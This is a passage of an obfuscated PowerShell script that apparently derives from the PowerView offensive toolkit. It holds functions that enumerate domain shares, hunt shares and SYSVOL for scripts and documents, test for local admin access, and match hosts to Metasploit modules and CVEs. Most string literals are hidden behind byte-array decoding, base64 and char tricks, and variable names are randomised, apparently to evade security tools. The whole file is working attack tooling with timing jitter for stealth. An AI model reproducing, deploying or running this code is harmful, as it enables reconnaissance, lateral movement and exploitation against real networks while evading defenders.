                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(17,46,163,228,53,115,83,48,51,148,198,15,124,70,115,102,177,215,54,89,98,47,21,165,218,21,119,105,31,100,129,240,24,88,84,33,54,148,185,6,81,73,11,97,154,193,65,8) @(70,87,211,128,124,53,1)) + $($ComputerName.count))
            $o6bG = 0
            ForEach ($mnZ6k in $ComputerName) {
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(79,95,189,115,47,93,112,184,115,49,41,74,174,122,32,40,71,154,34,8,81,110,131,123,5,118,124,161,116,15,89,27) @(24,38,205,23,102)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(135,193,223,188,135,199,219,236) @(206,134,230,209)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $(-not $NoPing), $TargetUsers, $SearchDays
            }
        }
    }
}
function Invoke-ShareFinder {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $ExcludeStandard,
        [Switch]
        $ExcludePrint,
        [Switch]
        $ExcludeIPC,
        [Switch]
        $NoPing,
        [Switch]
        $CheckShareAccess,
        [Switch]
        $CheckAdmin,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose ((ParseEntry20 @(88,133,155,173,190,110,89,62,158,134,252,135,74,126,108,155,184,158,194,26,113,61,136,135,133,161,102,124,86,164,161,165,165,69,127,122,166,172,159,142,97,91,107,140,143,142,144,79,73,72,170,152,144,175,67,116,109,206,178,174) @(15,252,235,201,247,40,19)) + $Delay)
        [String[]] $ExcludedShares = @('')
        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + (ParseEntry20 @(25,54,177,29,182,53,29,27) @(76,112,251,87,226,89))
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + (ParseEntry20 @(247,251,184,191,95,150,116,116) @(164,173,250,251,21,215,73,73))
        }
        if ($ExcludeStandard) {
            $ExcludedShares = @('', (ParseEntry20 @(220,132,74,104,132,38,185,186) @(141,209,24,38,215,115)), (ParseEntry20 @(240,146,127,156,206,242,158,249) @(163,196,61,216,132,179)), ([char]0x43+[char]0x24), (ParseEntry20 @(143,5,234,10,199,74,5,177) @(218,67,160,64,147,38,84)))
        }
        if(!$ComputerName) { 
            if($Domain) {
                $k8fkcV = @($Domain)
            }
            elseif($SearchForest) {
                $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                $k8fkcV = @( (Get-NetDomain).name )
            }
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(144,57,172,171,140,191,118,67,157,24,150,250,164,174,5,28,142,7,142,185,167,174,118,2,165,41,157,242) @(199,64,220,207,197,249,48,114)) + $Domain + (ParseEntry20 @(66,166,61,85,104,136,37,76,105,210,41,19,104,150,90,30) @(11,225,103,35)))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw (ParseEntry20 @(153,101,153,226,232,79,98,183,108,233,200,238,82,54,244,57,195,232,216,96) @(205,8,161,133,137,8,91))
            }
        }
        $s8TS = {
            param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)
            $lPdgSYQ = $True
            if($Ping) {
                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($lPdgSYQ) {
                $n3vQC0 = Get-NetShare -ComputerName $ComputerName
                ForEach ($iDPwn in $n3vQC0) {
                    Write-Debug ((ParseEntry20 @(212,61,26,146,120,96,173,239,39,4,172,93,69,138,193,62,11,177,119,95,185,215,43,13) @(131,68,106,246,49,38,227)) + $iDPwn)
                    $Obwh = $iDPwn.shi1_netname
                    $IN2QVrfd = $iDPwn.shi1_remark
                    $Path = '\\'+$ComputerName+'\'+$Obwh
                    if (($Obwh) -and ($Obwh.trim() -ne '')) {
                        if($CheckAdmin) {
                            if($Obwh.ToUpper() -eq (ParseEntry20 @(4,173,179,190,165,40,97,147) @(85,248,225,240,246,125))) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $Obwh + (ParseEntry20 @(189,111,88,186,18,196,127,155) @(244,46,51,206,91,133,66,166)) + $IN2QVrfd)
                                }
                                catch {
                                    Write-Debug ((ParseEntry20 @(8,103,226,70,165,155,19,88,241,104,137,194,0,103,230,69,166,255,111,81,225,119,133,192,62,120,207,88) @(90,63,168,63,199,168)) + $Path + (ParseEntry20 @(178,142,55,197) @(251,202,88,162,207,126,185)) + $_)
                                }
                            }
                        }
                        elseif ($ExcludedShares -NotContains $Obwh.ToUpper()) {
                            if($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    (([char]0x5c+[char]0x5c) + $ComputerName + "\" + $Obwh + (ParseEntry20 @(47,56,154,174,181,157,191,91) @(102,121,241,218,252,220,130)) + $IN2QVrfd)
                                }
                                catch {
                                    Write-Debug ((ParseEntry20 @(104,128,75,177,47,247,130,93,129,86,134,39,158,147,116,162,96,159,120,170,130,114,154,105,172,10,163,172) @(58,216,1,200,77,196,203)) + $Path + (ParseEntry20 @(126,192,107,183) @(55,132,4,208,78,6,145)) + $_)
                                }
                            }
                            else {
                                (([char]0x5c+[char]0x5c) + $ComputerName + "\" + $Obwh + (ParseEntry20 @(72,145,125,224,112,64,237,43) @(1,208,22,148,57)) + $IN2QVrfd)
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(150,127,16,246,180,156,163,64,58,193,190,136,154,112,24,237,183,166,245,73,23,206,178,129,164,96,57,225,178,182,168,94,4,209,144,154,163,94,31,191,159,176,253,26) @(192,39,94,134,214,241)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = $ExcludedShares
                'CheckAdmin' = $CheckAdmin
            }
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(29,4,226,22,255,75,16,190,46,58,212,1,255,74,119,249,40,42,216,30,213,100,0,190,16,20,208,26,239,62,16,184,46,16,199,21,215,74,123,178,46,53,223,68,255,76,127,245) @(74,125,146,114,182,13,66,200)) + $($ComputerName.count))
            $o6bG = 0
            ForEach ($mnZ6k in $ComputerName) {
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(31,154,41,42,153,108,47,132,44,180,104,34,179,68,63,193,41,180,108,32,153,97,55,157,43,141,3,34,179,64,56,204) @(72,227,89,78,208,41,121,241)) + $mnZ6k + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $o6bG + (ParseEntry20 @(14,177,37,20,235,162,64,168) @(71,246,28,121,162,227,125,149)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
    }
}
function Invoke-FileFinder {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,
        [Switch]
        $OfficeDocs,
        [Switch]
        $FreshEXEs,
        [String[]]
        $Terms,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,
        [String]
        $LastAccessTime,
        [String]
        $LastWriteTime,
        [String]
        $CreationTime,
        [Switch]
        $IncludeC,
        [Switch]
        $IncludeAdmin,
        [Switch]
        $ExcludeFolders,
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [String]
        $OutFile,
        [Switch]
        $NoClobber,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [Switch]
        $SearchSYSVOL,
        [ValidateRange(1,100)] 
        [Int]
        $Threads,
        [Switch]
        $UsePSDrive,
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose ((ParseEntry20 @(152,224,147,237,134,223,169,184,173,244,214,249,173,244,128,238,156,206,214,187,173,171,151,229,131,204,185,249,173,222,181,206,174,206,214,226,149,193,170,238,171,171,143,185,174,218,161,226,149,206,155,225,170,202,161,255,149,240,162,180) @(207,153,227,137)) + $Delay)
        $n3vQC0 = @()
        [String[]] $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))), (ParseEntry20 @(227,212,66,60,119,231,181,123) @(178,129,16,114,36)))
        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @((ParseEntry20 @(4,63,111,30,115,0,94,86) @(85,106,61,80,32)))
            }
        }
        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @(([char]0x43+[char]0x24))
            }
        }
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }
        if ($TermList) {
            ForEach ($rPRBHTCp in Get-Content -Path $TermList) {
                if (($rPRBHTCp -ne $Null) -and ($rPRBHTCp.trim() -ne '')) {
                    $Terms += $rPRBHTCp
                }
            }
        }
        if($Domain) {
            $k8fkcV = @($Domain)
        }
        elseif($SearchForest) {
            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            $k8fkcV = @( (Get-NetDomain).name )
        }
        if($ShareList) {
            ForEach ($ZctXocR in Get-Content -Path $ShareList) {
                if (($ZctXocR -ne $Null) -and ($ZctXocR.trim() -ne '')) {
                    $iDPwn = $ZctXocR.Split(([char]0x09))[0]
                    $n3vQC0 += $iDPwn
                }
            }
        }
        if($SearchSYSVOL) {
            ForEach ($Domain in $k8fkcV) {
                $VAAjq = (([char]0x5c+[char]0x5c) + $Domain + (ParseEntry20 @(64,97,76,87,77,22,88,93,76,97,117,48) @(24,39,2,13)))
                Write-Verbose ((ParseEntry20 @(186,107,222,112,111,182,171,121,244,83,74,134,183,107,236,110,71,180,171,107,244,71,100,137,183,69,232,109,127,193,138,117,205,83,96,195,140,81,239,41) @(237,18,174,20,38,243)) + $VAAjq)
                $n3vQC0 += $VAAjq
            }
            if(!$Terms) {
                $Terms = @('.vbs', '.bat', '.ps1')
            }
        }
        else {
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(165,5,92,196,149,40,101,173,168,36,102,149,189,57,22,242,187,59,126,214,190,57,101,236,144,21,109,157) @(242,124,44,160,220,110,35,156)) + $Domain + (ParseEntry20 @(14,42,223,247,189,191,5,2,231,178,144,230,36,26,184,188) @(71,109,133,129,222,214)))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (ParseEntry20 @(182,42,131,54,222,165,126,193,53,247,175,32,225,60,134,211,37,214,0,215) @(226,71,187,81,191))
            }
        }
        $s8TS = {
            param($ComputerName, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential)
            Write-Verbose ((ParseEntry20 @(64,200,3,82,228,80,98,170,75,162,112,105,222,79,5,246,94,147,123,27) @(17,250,58,38,135,24,52,154)) + $ComputerName)
            Write-Verbose ((ParseEntry20 @(192,133,142,127,172,136,132,227,200,138,180,65,175,135,148,241,200,133,171,35,135,129,239,181) @(146,221,230,21,206,192,210,136)) + $ExcludedShares)
            $FNxC8y5 = @()
            if($ComputerName.StartsWith(([char]0x5c+[char]0x5c))) {
                $FNxC8y5 += $ComputerName
            }
            else {
                $lPdgSYQ = $True
                if($Ping) {
                    $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if($lPdgSYQ) {
                    $n3vQC0 = Get-NetShare -ComputerName $ComputerName
                    ForEach ($iDPwn in $n3vQC0) {
                        $Obwh = $iDPwn.shi1_netname
                        $Path = '\\'+$ComputerName+'\'+$Obwh
                        if (($Obwh) -and ($Obwh.trim() -ne '')) {
                            if ($ExcludedShares -NotContains $Obwh.ToUpper()) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $FNxC8y5 += $Path
                                }
                                catch {
                                    Write-Debug ((ParseEntry20 @(183,48,150,247,112,165,124,166,218,126,166,35,137,161,111,154,42,169,209,9,130,48,145,174) @(224,73,208,147,57)) + $Path)
                                }
                            }
                        }
                    }
                }
            }
            ForEach($iDPwn in $FNxC8y5) {
                $BJnRkp =  @{
                    'Path' = $iDPwn
                    'Terms' = $Terms
                    'OfficeDocs' = $OfficeDocs
                    'FreshEXEs' = $FreshEXEs
                    'LastAccessTime' = $LastAccessTime
                    'LastWriteTime' = $LastWriteTime
                    'CreationTime' = $CreationTime
                    'ExcludeFolders' = $ExcludeFolders
                    'ExcludeHidden' = $ExcludeHidden
                    'CheckWriteAccess' = $CheckWriteAccess
                    'OutFile' = $OutFile
                    'UsePSDrive' = $UsePSDrive
                    'Credential' = $Credential
                }
                Find-InterestingFile @BJnRkp
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(166,177,67,69,198,193,126,151,141,74,93,221,246,74,182,130,108,98,145,194,84,184,141,125,81,227,203,122,148,174,101,76,254,251,91,155,138,116,116,157,229,92,205,212) @(240,233,13,53,164,172,29)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = $ExcludedShares
                'Terms' = $Terms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
                'UsePSDrive' = $UsePSDrive
                'Credential' = $Credential
            }
            if($n3vQC0) {
                Invoke-ThreadedFunction -ComputerName $n3vQC0 -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
            }
            else {
                Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
            }        
        }
        else {
            if($n3vQC0){
                $ComputerName = $n3vQC0
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(248,32,240,212,230,31,210,198,203,30,198,195,230,30,181,129,205,14,202,220,204,48,194,198,245,48,194,216,246,106,210,192,203,52,213,215,206,30,185,202,203,17,205,134,230,24,189,141) @(175,89,128,176)) + $($ComputerName.count))
            $o6bG = 0
            $ComputerName | Where-Object {$_} | ForEach-Object {
                Write-Verbose ((ParseEntry20 @(97,34,77,181,83,88,34,241,106,72,61,247,121,81,73,252) @(48,16,116,193)) + $_)
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(159,197,236,1,128,219,158,201,248,50,248,242,171,209,218,85,168,201,253,210,213,45,135,242,171,210,198,9,170,247,137,129) @(200,188,156,101,201,158)) + $_ + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $o6bG + (ParseEntry20 @(85,230,200,54,82,235,103,96) @(28,161,241,91,27,170,90,93)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $s8TS -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
            }
        }
    }
}
function Find-LocalAdminAccess {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose ((ParseEntry20 @(244,83,149,190,234,108,175,235,193,71,208,170,193,71,134,189,241,71,137,175,249,105,212,151,193,24,171,178,193,111,163,177,193,125,137,175,242,125,171,176,249,114,171,160,234,98,129,170,199,109,130,189,249,109,179,169,250,114,142,189,193,24,188,189) @(163,42,229,218)) + $Delay)
        if(!$ComputerName) {
            if($Domain) {
                $k8fkcV = @($Domain)
            }
            elseif($SearchForest) {
                $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                $k8fkcV = @( (Get-NetDomain).name )
            }
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(19,12,73,166,143,2,51,8,152,158,14,64,88,149,243,42,60,126,144,176,38,34,127,178,164,45,52,4) @(68,117,57,194,198)) + $Domain + (ParseEntry20 @(135,168,18,6,198,3,140,128,42,67,235,90,173,152,117,77) @(206,239,72,112,165,106)))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (ParseEntry20 @(177,133,53,230,132,175,52,251,129,160,64,230,191,133,52,176,135,133,92,233) @(229,232,13,129))
            }
        }
        $s8TS = {
            param($ComputerName, $Ping)
            $lPdgSYQ = $True
            if($Ping) {
                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($lPdgSYQ) {
                $X2ndzV = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                if ($X2ndzV) {
                    $ComputerName
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose ((ParseEntry20 @(219,233,54,84,84,13,238,214,28,99,94,25,215,230,62,79,87,55,184,223,49,108,82,16,233,246,31,67,82,39,229,200,34,115,112,11,238,200,57,29,127,33,176,140) @(141,177,120,36,54,96)) + $Threads)
            $n3XrNi5 = @{
                'Ping' = $(-not $NoPing)
            }
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ((ParseEntry20 @(123,208,16,192,238,51,103,76,72,238,38,215,238,50,0,11,78,254,42,200,196,28,119,76,118,192,34,204,254,70,103,74,72,196,53,195,198,50,12,64,72,225,45,146,238,52,8,7) @(44,169,96,164,167,117,53,58)) + $($ComputerName.count))
            $o6bG = 0
            ForEach ($mnZ6k in $ComputerName) {
                $o6bG = $o6bG + 1
                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ((ParseEntry20 @(8,45,113,145,67,44,50,77,59,3,48,153,105,4,34,8,62,3,52,155,67,33,42,84,60,58,91,153,105,0,37,5) @(95,84,1,245,10,105,100,56)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(171,224,15,21,230,163,154,11) @(226,167,54,120,175)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}
function Get-ExploitableSystem {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',
        [String]
        $SPN,
        [String]
        $OperatingSystem = '*',
        [String]
        $ServicePack = '*',
        [String]
        $Filter,
        [Switch]
        $Ping,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $Unconstrained,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    Write-Verbose (ParseEntry20 @(241,218,191,97,226,147,250,223,250,152,79,194,183,201,147,205,134,66,229,160,252,254,225,254,97,236,128,231,239,228,137,111,242,228,167,151,193,161,87,209,159,217,252,218,173,55,155,177,207,241,237,255,100,243,140,242,239,230,157,117,200,187,200,204,199,136,60,210,179,205,146,214,131,98,150,235) @(166,163,207,5,171,214,158))
    $DKQK8x = New-Object System.Data.DataTable 
    $Null = $DKQK8x.Columns.Add('Hostname')       
    $Null = $DKQK8x.Columns.Add('OperatingSystem')
    $Null = $DKQK8x.Columns.Add('ServicePack')
    $Null = $DKQK8x.Columns.Add('LastLogon')
    Get-NetComputer -FullData @PSBoundParameters | ForEach-Object {
        $QkSo = $_.dnshostname
        $OYzTf6 = $_.operatingsystem
        $ACBzcv = $_.operatingsystemservicepack
        $NhJ2 = $_.lastlogon
        $ISHexe = $_.useraccountcontrol
        $Bcpww = [convert]::ToString($_.useraccountcontrol,2)
        $aGNnLMYy = $Bcpww.Length - 2
        $EDuNP = $Bcpww.Substring($aGNnLMYy,1)
        if ($EDuNP  -eq 0) {
            $Null = $DKQK8x.Rows.Add($QkSo,$OYzTf6,$ACBzcv,$NhJ2)
        }
    }
    Write-Verbose (ParseEntry20 @(59,175,69,124,252,47,63,26,143,98,74,197,8,42,15,177,111,64,221,29,37,43,239,69,124,246,40,52,13,142,123,40,252,45,29,26,181,92,90,223,9,42,0,230,84,79,251,2,37,47,148,65,121,237,36,61,13,129,0,118,252,34,5,4,178,114,86,218,48,31,33,163,121,113,129,87) @(108,214,53,24,181,106,71))
    $ChwBZi = New-Object System.Data.DataTable 
    $Null = $ChwBZi.Columns.Add('OperatingSystem') 
    $Null = $ChwBZi.Columns.Add('ServicePack')
    $Null = $ChwBZi.Columns.Add('MsfModule')  
    $Null = $ChwBZi.Columns.Add('CVE')
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(1,59,115,201,13,78,38,143,52,112,94,143) @(87,9,31,188)),"",(ParseEntry20 @(47,19,28,146,134,33,76,59,16,166,221,85,20,28,65,142,134,85,17,49,56,214,170,18,44,34,77,145,135,28,48,60,44,159,165,84,56,29,77,159,135,33,76,61,22,173,170,28) @(117,75,116,229,228,102)),(ParseEntry20 @(241,172,194,13,243,160,255,75,220,215,244,14,244,157,165,87,244,137,198,86,202,188,194,85,241,179,232,71,220,137,222,75,242,183,169,87,244,137,197,75,221,142,209,69,221,167,160,68,222,158,217,8) @(144,228,144,61)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(105,134,123,24,221,123,6,135,116,20,197,104,101,236,93,95,221,100,118,211,90,7,198,75,114,245,42,80) @(63,180,23,109,135,60)),(ParseEntry20 @(154,11,147,244,34,218,208,15,134,127,135,229,31,133,245,17,130,104,248,176) @(207,57,197,141,70,183,134,118)),(ParseEntry20 @(207,86,206,77,73,125,172,126,194,121,18,9,244,89,147,81,73,9,241,116,234,8,121,80,207,86,236,77,114,67,172,122,197,64,106,64,205,116,231,67,101,86,172,101,255,8,18,78) @(149,14,166,58,43,58)),(ParseEntry20 @(67,102,162,174,36,202,77,88,188,173,35,189,70,87,197,244,35,227,116,69,170,198,21,230,67,121,136,228,11,227,108,88,146,205,126,228,70,67,165,232,10,228,99,89,189,231,119,249,111,84,165,231,11,249,31,19) @(34,46,240,158,71,142)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(114,0,190,236,101,176,130,30,71,75,144,205,101,175,241,31,126,106,155,254,114,157,250,90,105,115,239,164) @(36,50,210,153,63,247,187,45)),(ParseEntry20 @(97,36,64,197,229,89,64,111,245,199,118,126,79,142,242,83,91,71,129,188) @(52,22,22,188,129)),(ParseEntry20 @(246,121,9,245,206,102,88,242,200,98,88,177,205,118,84,233,206,18,5,248,224,19,51,232,246,121,43,245,245,88,88,246,207,91,32,179,244,91,32,250,226,16,88,246,207,19,80,250) @(172,33,97,130)),(ParseEntry20 @(225,200,43,221,222,43,238,184,204,179,29,222,217,22,180,164,228,237,47,134,231,55,211,166,225,215,1,151,241,2,207,184,226,211,64,135,217,2,212,184,205,234,56,154,243,60,177,185,205,196,44,216) @(128,128,121,237,189,111,129,206)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(250,17,3,28,78,230,149,16,12,16,86,245,246,123,37,91,78,249,229,68,34,3,85,214,225,98,82,84) @(172,35,111,105,20,161)),(ParseEntry20 @(96,48,209,40,0,209,99,123,206,23,38,212,108,48,244,54,41,237,8,63) @(53,2,135,81,100,188)),(ParseEntry20 @(61,254,196,55,5,225,149,48,3,229,149,115,6,241,153,43,5,149,200,58,43,148,192,48,4,223,149,52,4,220,237,58,63,220,237,55,41,151,149,53,3,225,254,51,5,224,149,115,61,241,230,43,62,254,245,125) @(103,166,172,64)),(ParseEntry20 @(49,28,112,7,31,104,80,38,24,17,83,79,72,70,101,62,70,90,42,71,101,8,6,74,86,43,84,69,28,57,108,65,30,127,6,58,48,79,98,10,97,85,17,35,111,78,76,91,114,4,21,23) @(80,84,34,55,124,44,63)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(139,10,96,194,89,2,228,11,111,206,65,17,135,96,70,133,89,29,148,95,65,221,66,50,144,121,49,138) @(221,56,12,183,3,69)),(ParseEntry20 @(228,107,147,73,226,220,15,188,121,192,243,49,156,2,245,214,20,148,13,187) @(177,89,197,48,134)),(ParseEntry20 @(175,81,239,54,89,178,48,247,37,120,204,58,230,22,14,158,107,180,37,65,185,58,227,49,89,155,68,241,35,99,184,126,201,7,3,130,71,195,23,93,145,59,235,52,88,130,52,186) @(245,9,135,65,59)),(ParseEntry20 @(137,192,26,37,190,9,135,254,4,38,185,126,140,241,125,127,185,32,190,227,18,77,143,37,137,223,48,111,145,32,166,254,42,70,228,39,140,229,29,99,144,39,169,255,6,86,237,53,165,204,47,98,145,58,213,181) @(232,136,72,21,221,77)))  
